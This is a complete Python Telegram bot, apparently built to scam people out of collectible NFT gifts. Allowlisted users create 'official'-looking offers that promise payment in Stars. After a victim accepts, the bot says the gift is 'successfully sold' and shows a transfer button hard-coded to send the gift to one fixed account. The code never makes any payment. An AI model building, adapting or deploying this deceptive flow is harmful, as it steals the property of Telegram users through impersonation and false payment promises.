import asyncio
import html
import logging
import re
import sqlite3
import uuid
from datetime import datetime, timedelta
from urllib.parse import urlparse

import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message,
    InlineQuery,
    InlineQueryResultPhoto,
    InlineQueryResultArticle,
    InputTextMessageContent,
    LinkPreviewOptions,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder


# ============================================================
# НАСТРОЙКИ
# ============================================================

# Вставь сюда новый токен от @BotFather.
# Не отправляй токен в чат и не размещай его в публичном GitHub.
BOT_TOKEN = "ВСТАВЬ_СЮДА_НОВЫЙ_ТОКЕН"

# Telegram ID администратора. Можно добавить несколько ID.
ADMIN_IDS = {8630566465}

BOT_USERNAME = "OficialOfferTelegram_bot"
DB_PATH = "offers.sqlite3"
OFFER_LIFETIME_HOURS = 6

# Telegram deep link: открывает передачу подарка указанному получателю.
# Это НЕ экран покупки Premium. Проверьте получателя и подарок перед подтверждением.
PREMIUM_GIFT_LINK = "tg://send_gift?to=Toriko_obnal"

if not BOT_TOKEN or BOT_TOKEN == "ВСТАВЬ_СЮДА_НОВЫЙ_ТОКЕН":
    raise RuntimeError("Вставь новый BOT_TOKEN в начало файла main.py")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

db = sqlite3.connect(DB_PATH)
db.row_factory = sqlite3.Row
db.execute("PRAGMA journal_mode=WAL")


# ============================================================
# БАЗА ДАННЫХ
# ============================================================

db.execute("""
CREATE TABLE IF NOT EXISTS allowed_users (
    user_id INTEGER PRIMARY KEY
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS offers (
    offer_id TEXT PRIMARY KEY,
    seller_id INTEGER NOT NULL,
    seller_name TEXT NOT NULL,
    nft_url TEXT NOT NULL,
    nft_name TEXT NOT NULL,
    price TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'open',
    buyer_id INTEGER,
    buyer_name TEXT,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
)
""")
db.commit()


def is_allowed(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    return db.execute(
        "SELECT 1 FROM allowed_users WHERE user_id = ?",
        (user_id,),
    ).fetchone() is not None


def parse_nft_link(value: str):
    """Принимает t.me/nft/slug, https://t.me/nft/slug и ссылку в Markdown."""
    value = (value or "").strip()

    # Если ссылка вставлена как [текст](URL), берём именно URL из скобок.
    markdown_match = re.fullmatch(r"\[[^\]]+\]\((https?://[^\s)]+)\)", value)
    if markdown_match:
        value = markdown_match.group(1)

    # Убираем обрамление, которое иногда добавляют клиенты/копирование.
    value = value.strip("<>\"'` ")
    value = value.rstrip(".,;!?)]")

    if value.startswith("t.me/"):
        value = "https://" + value
    elif value.startswith("www.t.me/"):
        value = "https://" + value
    elif value.startswith("//t.me/"):
        value = "https:" + value

    parsed = urlparse(value)
    if parsed.scheme not in {"http", "https"} or parsed.netloc.lower() not in {"t.me", "www.t.me"}:
        return None

    match = re.fullmatch(r"/nft/([A-Za-z0-9_-]+)/?", parsed.path)
    if not match:
        return None

    slug = match.group(1)
    display_name = re.sub(r"(?<=[a-z])(?=[A-Z])", " ", slug)
    display_name = re.sub(r"-(\d+)$", r" #\1", display_name)
    return f"https://t.me/nft/{slug}", display_name


async def get_nft_image_url(nft_url: str) -> str | None:
    """Получает прямую картинку NFT из Open Graph карточки t.me/nft."""
    timeout = aiohttp.ClientTimeout(total=1.5, connect=1.0, sock_read=1.0)
    headers = {"User-Agent": "Mozilla/5.0 (compatible; NFTOfferBot/1.0)"}
    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            async with session.get(nft_url, allow_redirects=True) as response:
                if response.status != 200:
                    logging.warning("NFT page returned HTTP %s: %s", response.status, nft_url)
                    return None
                page = await response.text(errors="ignore")

        tags = re.findall(r"<meta\b[^>]*>", page, flags=re.IGNORECASE)
        for tag in tags:
            is_image_meta = re.search(
                r"(?:property|name)\s*=\s*['\"](?:og:image|twitter:image)['\"]",
                tag,
                re.IGNORECASE,
            )
            if not is_image_meta:
                continue
            match = re.search(r"content\s*=\s*['\"]([^'\"]+)['\"]", tag, re.IGNORECASE)
            if match:
                image_url = html.unescape(match.group(1)).strip()
                parsed_image = urlparse(image_url)
                if parsed_image.scheme in {"https", "http"} and parsed_image.netloc:
                    return image_url
    except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
        logging.warning("Не удалось получить изображение NFT %s: %s", nft_url, exc)
    return None


def get_offer(offer_id: str):
    return db.execute(
        "SELECT * FROM offers WHERE offer_id = ?",
        (offer_id,),
    ).fetchone()


def is_expired(row) -> bool:
    try:
        created = datetime.fromisoformat(row["created_at"])
    except (TypeError, ValueError):
        return False

    return datetime.utcnow() > created + timedelta(
        hours=OFFER_LIFETIME_HOURS
    )


def expire_offer_if_needed(row):
    if row and row["status"] == "open" and is_expired(row):
        db.execute(
            "UPDATE offers SET status = 'expired' "
            "WHERE offer_id = ? AND status = 'open'",
            (row["offer_id"],),
        )
        db.commit()
        return get_offer(row["offer_id"])
    return row


def safe(value) -> str:
    return html.escape(str(value or ""))


def nft_preview_options(row) -> LinkPreviewOptions:
    """Показывает нативное превью collectible-подарка Telegram по t.me/nft ссылке."""
    return LinkPreviewOptions(
        url=row["nft_url"],
        prefer_large_media=True,
        show_above_text=True,
    )


def nft_title_link(row) -> str:
    """Ссылка скрыта за названием NFT, чтобы не выводить длинный URL в офере."""
    return f'<a href="{safe(row["nft_url"])}">{safe(row["nft_name"])}</a>'


# ============================================================
# ТЕКСТЫ ЭКРАНОВ
# ============================================================

def make_offer_text(row) -> str:
    """Первый экран: предложение покупателю."""
    created = datetime.fromisoformat(row["created_at"])
    expires_at = created + timedelta(hours=OFFER_LIFETIME_HOURS)
    remaining = max(0, int((expires_at - datetime.utcnow()).total_seconds()))

    # Показываем минуты и секунды до истечения срока.
    hours, remainder = divmod(remaining, 3600)
    minutes = remainder // 60

    if hours:
        time_text = f"{hours} ч. {minutes:02d} мин."
    else:
        time_text = f"{minutes} мин."

    return (
        f"Пользователь {safe(row['seller_name'])} предлагает\n"
        f"Вам {safe(row['price'])} за подарок "
        f"{nft_title_link(row)}.\n\n"
        f"⏳ Предложение истекает через {time_text}."
    )


def make_accepted_text(row) -> str:
    """Второй экран: оффер принят."""
    return (
        f"🎁 Подарок: {nft_title_link(row)} успешно продан!\n\n"
        f"Передайте подарок {safe(row['buyer_name'])} "
        f"для расчёта на {safe(row['price'])}."
    )


def make_how_to_text(row) -> str:
    """Третий экран: инструкция по передаче."""
    return (
        f"🎁 Как передать подарок пользователю "
        f"{safe(row['buyer_name'])}.\n\n"
        f"Подарок: {nft_title_link(row)}.\n\n"
        f"1. Передайте подарок пользователю "
        f"{safe(row['buyer_name'])}.\n"
        f"2. Нажмите «Передать NFT» и выберите "
        f"«{safe(row['nft_name'])}».\n"
        "3. Подтвердите передачу подарка.\n\n"
        "После передачи проверьте её в Telegram. "
        "Резерв оффера действует 6 часов."
    )


def make_keyboard(row) -> InlineKeyboardMarkup | None:
    builder = InlineKeyboardBuilder()
    offer_id = row["offer_id"]
    status = row["status"]

    if status == "open":
        builder.row(
            InlineKeyboardButton(
                text="Принять",
                callback_data=f"accept:{offer_id}",
            ),
            InlineKeyboardButton(
                text="Отклонить",
                callback_data=f"decline:{offer_id}",
            ),
        )

    elif status == "accepted":
        builder.row(
            InlineKeyboardButton(
                text="Как передать?",
                callback_data=f"how:{offer_id}",
            ),
            InlineKeyboardButton(
                text="Передать NFT",
                url=PREMIUM_GIFT_LINK,
            ),
        )

    elif status == "how":
        builder.row(
            InlineKeyboardButton(
                text="Передать NFT",
                url=PREMIUM_GIFT_LINK,
            ),
            InlineKeyboardButton(
                text="Вернуться",
                callback_data=f"back:{offer_id}",
            ),
        )

    elif status == "accepted_return":
        builder.row(
            InlineKeyboardButton(
                text="Передать NFT",
                url=PREMIUM_GIFT_LINK,
            )
        )

    elif status == "transferred":
        builder.row(
            InlineKeyboardButton(
                text="Подтвердить получение",
                callback_data=f"received:{offer_id}",
            )
        )

    return builder.as_markup() if builder.buttons else None


# ============================================================
# КОМАНДЫ
# ============================================================

@dp.message(CommandStart())
async def start(message: Message):
    await message.answer(
        "🎁 <b>NFT OFFER</b>\n\n"
        "Бот создаёт предложения о передаче подарков.\n\n"
        "Формат для создания оффера в любом чате:\n"
        f"<code>@{BOT_USERNAME} "
        "t.me/nft/MousseCake-46483 20</code>\n\n"
        "Последнее число — цена в Stars, указанная в оффере.\n"
        "Срок действия оффера — 6 часов.",
        parse_mode="HTML",
    )


@dp.message(Command("myid"))
async def my_id(message: Message):
    await message.answer(f"Ваш Telegram ID: <code>{message.from_user.id}</code>", parse_mode="HTML")


@dp.message(Command("allow", "grant"))
async def allow_user(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return

    parts = (message.text or "").split()
    if len(parts) != 2 or not parts[1].isdigit():
        await message.answer("Формат: /allow TELEGRAM_ID (или /grant TELEGRAM_ID)")
        return

    user_id = int(parts[1])
    db.execute(
        "INSERT OR IGNORE INTO allowed_users(user_id) VALUES(?)",
        (user_id,),
    )
    db.commit()
    await message.answer(f"Пользователь {user_id} добавлен в список.")


@dp.message(Command("deny", "revoke"))
async def deny_user(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return

    parts = (message.text or "").split()
    if len(parts) != 2 or not parts[1].isdigit():
        await message.answer("Формат: /deny TELEGRAM_ID (или /revoke TELEGRAM_ID)")
        return

    user_id = int(parts[1])
    db.execute(
        "DELETE FROM allowed_users WHERE user_id = ?",
        (user_id,),
    )
    db.commit()
    await message.answer(f"Пользователь {user_id} удалён из списка.")


@dp.message(Command("access"))
async def access_help(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return
    await message.answer(
        "Управление доступом к созданию оферов:\n"
        "/allow TELEGRAM_ID — выдать доступ\n"
        "/deny TELEGRAM_ID — забрать доступ\n"
        "/users — список пользователей с доступом\n\n"
        "Пользователь может узнать свой ID командой /myid."
    )


@dp.message(Command("users"))
async def users(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return

    rows = db.execute(
        "SELECT user_id FROM allowed_users ORDER BY user_id"
    ).fetchall()
    result = "\n".join(str(row["user_id"]) for row in rows) or "Список пуст."
    await message.answer(result)


# ============================================================
# СОЗДАНИЕ ОФФЕРА ЧЕРЕЗ INLINE MODE
# Формат: @OficialOfferTelegram_bot t.me/nft/Slug-123 20
# ============================================================

@dp.inline_query()
async def create_inline_offer(query: InlineQuery):
    """Создаёт оффер через Inline Mode и возвращает понятные подсказки вместо пустого списка."""
    user_id = query.from_user.id
    raw_query = (query.query or "").strip()
    logging.info(
        "INLINE_REQUEST user_id=%s username=%s query=%r allowed=%s",
        user_id, query.from_user.username, raw_query, is_allowed(user_id)
    )

    # Не скрываем причину отказа пустым списком.
    if not is_allowed(user_id):
        notice = InlineQueryResultArticle(
            id=f"denied-{user_id}",
            title="Нет доступа к созданию оферов",
            description=f"Ваш Telegram ID: {user_id}. Передайте его администратору.",
            input_message_content=InputTextMessageContent(
                message_text=(
                    "⛔ У вас пока нет доступа к созданию оферов.\n"
                    f"Ваш Telegram ID: {user_id}\n"
                    "Попросите администратора добавить его командой:\n"
                    f"/allow {user_id}"
                )
            ),
        )
        await query.answer([notice], cache_time=0, is_personal=True)
        return

    parts = raw_query.split()
    if len(parts) != 2:
        hint = InlineQueryResultArticle(
            id=f"hint-{user_id}",
            title="Как создать офер",
            description="Укажите ссылку на подарок и цену в Stars",
            input_message_content=InputTextMessageContent(
                message_text=(
                    "Формат создания офера:\n"
                    f"@{BOT_USERNAME} t.me/nft/MousseCake-46483 20"
                )
            ),
        )
        await query.answer([hint], cache_time=0, is_personal=True)
        return

    parsed_link = parse_nft_link(parts[0])
    if not parsed_link:
        hint = InlineQueryResultArticle(
            id=f"badlink-{user_id}",
            title="Неверная ссылка на NFT",
            description="Подойдут t.me/nft/Название-123 и https://t.me/nft/Название-123",
            input_message_content=InputTextMessageContent(
                message_text="Проверьте ссылку. Примеры: t.me/nft/MousseCake-46483 или https://t.me/nft/MousseCake-46483"
            ),
        )
        await query.answer([hint], cache_time=0, is_personal=True)
        return

    if not parts[1].isdigit() or int(parts[1]) <= 0:
        hint = InlineQueryResultArticle(
            id=f"badprice-{user_id}",
            title="Неверная цена",
            description="Укажите положительное целое число, например 20",
            input_message_content=InputTextMessageContent(
                message_text="Цена должна быть положительным целым числом. Пример: 20"
            ),
        )
        await query.answer([hint], cache_time=0, is_personal=True)
        return

    nft_url, nft_name = parsed_link
    price = f"{int(parts[1])} ⭐"
    seller_name = (
        f"@{query.from_user.username}"
        if query.from_user.username
        else query.from_user.full_name
    )

    # Сначала немедленно готовим и отправляем текстовую карточку.
    # Получение внешнего изображения не должно блокировать Inline Mode.
    offer_id = uuid.uuid4().hex[:12]
    try:
        db.execute(
            """
            INSERT INTO offers
            (offer_id, seller_id, seller_name, nft_url, nft_name, price)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (offer_id, user_id, seller_name, nft_url, nft_name, price),
        )
        db.commit()
        row = get_offer(offer_id)

        article_result = InlineQueryResultArticle(
            id=offer_id,
            title=f"Офер: {nft_name} — {price}",
            description="Нажмите, чтобы отправить предложение в чат",
            input_message_content=InputTextMessageContent(
                message_text=make_offer_text(row),
                parse_mode="HTML",
                link_preview_options=nft_preview_options(row),
            ),
            reply_markup=make_keyboard(row),
        )
        await query.answer([article_result], cache_time=0, is_personal=True)
        logging.info(
            "OFFER_CREATED offer_id=%s seller_id=%s nft=%s price=%s",
            offer_id, user_id, nft_url, price
        )
    except Exception:
        logging.exception("INLINE_OFFER_FAILED user_id=%s query=%r", user_id, raw_query)
        # Если Telegram не принял результат, удаляем незавершённую запись,
        # чтобы в базе не оставались оферы, которых никто не увидел.
        try:
            db.execute("DELETE FROM offers WHERE offer_id = ?", (offer_id,))
            db.commit()
        except Exception:
            logging.exception("Не удалось удалить незавершённый офер %s", offer_id)
        # Возвращаем пользователю понятную карточку ошибки.
        try:
            error_result = InlineQueryResultArticle(
                id=f"error-{uuid.uuid4().hex[:12]}",
                title="Не удалось создать офер",
                description="Проверьте журнал хостинга или обратитесь к администратору",
                input_message_content=InputTextMessageContent(
                    message_text="Не удалось создать офер. Администратор может посмотреть ошибку в логах хостинга."
                ),
            )
            await query.answer([error_result], cache_time=0, is_personal=True)
        except Exception:
            logging.exception("Не удалось отправить сообщение об ошибке Inline Mode")


# ============================================================
# ОБНОВЛЕНИЕ INLINE-СООБЩЕНИЯ
# ============================================================

async def update_inline_offer(callback: CallbackQuery, row, text: str = None):
    if not callback.inline_message_id:
        return

    if text is None:
        if row["status"] == "open":
            text = make_offer_text(row)
        elif row["status"] in {"accepted", "accepted_return"}:
            text = make_accepted_text(row)
        elif row["status"] == "how":
            text = make_how_to_text(row)
        elif row["status"] == "declined":
            text = "❌ Предложение отклонено."
        elif row["status"] == "expired":
            text = "⌛ Срок действия предложения истёк."
        elif row["status"] == "transferred":
            text = (
                f"🎁 Подарок {safe(row['nft_name'])} отмечен как переданный.\n\n"
                "Покупатель может подтвердить получение."
            )
        elif row["status"] == "completed":
            text = "✅ Получение подтверждено."
        else:
            text = make_accepted_text(row)

    try:
        # Фото-оффер обновляем через caption, текстовый fallback — через text.
        await bot.edit_message_caption(
            inline_message_id=callback.inline_message_id,
            caption=text,
            parse_mode="HTML",
            reply_markup=make_keyboard(row),
        )
    except Exception as caption_error:
        logging.info("Сообщение не с фото, пробую изменить текст: %s", caption_error)
        try:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=text,
                parse_mode="HTML",
                link_preview_options=nft_preview_options(row),
                reply_markup=make_keyboard(row),
            )
        except Exception:
            logging.exception("Не удалось обновить сообщение оффера ни как фото, ни как текст")


# ============================================================
# ОБРАБОТКА КНОПОК
# ============================================================

@dp.callback_query(
    F.data.startswith((
        "accept:", "decline:", "how:", "back:",
        "sent:", "received:"
    ))
)
async def handle_offer_button(callback: CallbackQuery):
    action, offer_id = callback.data.split(":", 1)
    row = get_offer(offer_id)

    if row is None:
        await callback.answer("Предложение не найдено.", show_alert=True)
        return

    row = expire_offer_if_needed(row)
    if row["status"] == "expired":
        await update_inline_offer(callback, row)
        await callback.answer("Срок действия предложения истёк.", show_alert=True)
        return

    user_id = callback.from_user.id

    if action == "accept":
        if row["status"] != "open":
            await callback.answer("Предложение уже обработано.", show_alert=True)
            return
        if user_id == row["seller_id"]:
            await callback.answer("Нельзя принять собственное предложение.", show_alert=True)
            return

        buyer_name = (
            f"@{callback.from_user.username}"
            if callback.from_user.username
            else callback.from_user.full_name
        )
        cursor = db.execute(
            """
            UPDATE offers
            SET status = 'accepted', buyer_id = ?, buyer_name = ?
            WHERE offer_id = ? AND status = 'open'
            """,
            (user_id, buyer_name, offer_id),
        )
        db.commit()
        if cursor.rowcount != 1:
            await callback.answer("Предложение уже принял другой пользователь.", show_alert=True)
            return
        updated = get_offer(offer_id)
        await update_inline_offer(callback, updated)
        await callback.answer("Предложение принято.")
        return

    if action == "decline":
        if row["status"] != "open":
            await callback.answer("Предложение уже обработано.", show_alert=True)
            return
        if user_id == row["seller_id"]:
            await callback.answer("Нельзя отклонить собственное предложение.", show_alert=True)
            return

        db.execute(
            "UPDATE offers SET status = 'declined' "
            "WHERE offer_id = ? AND status = 'open'",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_inline_offer(callback, updated)
        await callback.answer("Предложение отклонено.")
        return

    if action == "how":
        if user_id != row["buyer_id"]:
            await callback.answer(
                "Инструкцию может открыть покупатель, принявший предложение.",
                show_alert=True,
            )
            return
        if row["status"] not in {"accepted", "accepted_return"}:
            await callback.answer("Сначала предложение должно быть принято.", show_alert=True)
            return
        db.execute(
            "UPDATE offers SET status = 'how' WHERE offer_id = ?",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_inline_offer(callback, updated)
        await callback.answer()
        return

    if action == "back":
        if user_id != row["buyer_id"]:
            await callback.answer(
                "Вернуться может покупатель, принявший предложение.",
                show_alert=True,
            )
            return
        if row["status"] != "how":
            await callback.answer("Экран инструкции уже закрыт.", show_alert=True)
            return
        db.execute(
            "UPDATE offers SET status = 'accepted_return' WHERE offer_id = ?",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_inline_offer(callback, updated)
        await callback.answer()
        return

    if action == "sent":
        if user_id != row["seller_id"]:
            await callback.answer(
                "Отметить передачу может только создатель оффера.",
                show_alert=True,
            )
            return
        if row["status"] not in {"accepted", "accepted_return"}:
            await callback.answer("Сначала покупатель должен принять предложение.", show_alert=True)
            return
        db.execute(
            "UPDATE offers SET status = 'transferred' WHERE offer_id = ?",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_inline_offer(callback, updated)
        await callback.answer("Отметка сохранена. Покупатель может подтвердить получение.")
        return

    if action == "received":
        if user_id != row["buyer_id"]:
            await callback.answer("Подтвердить получение может только покупатель.", show_alert=True)
            return
        if row["status"] != "transferred":
            await callback.answer("Продавец ещё не отметил передачу.", show_alert=True)
            return

        db.execute(
            "UPDATE offers SET status = 'completed' WHERE offer_id = ?",
            (offer_id,),
        )
        db.commit()
        updated = get_offer(offer_id)
        await update_inline_offer(callback, updated)
        await callback.answer("Получение подтверждено.")
        return


# ============================================================
# ЗАПУСК
# ============================================================

async def main():
    me = await bot.get_me()
    logging.info(
        "NFT Offer Bot запущен: @%s, bot_id=%s, admin_ids=%s",
        me.username, me.id, sorted(ADMIN_IDS)
    )
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        await bot.session.close()
        db.close()


if __name__ == "__main__":
    asyncio.run(main())
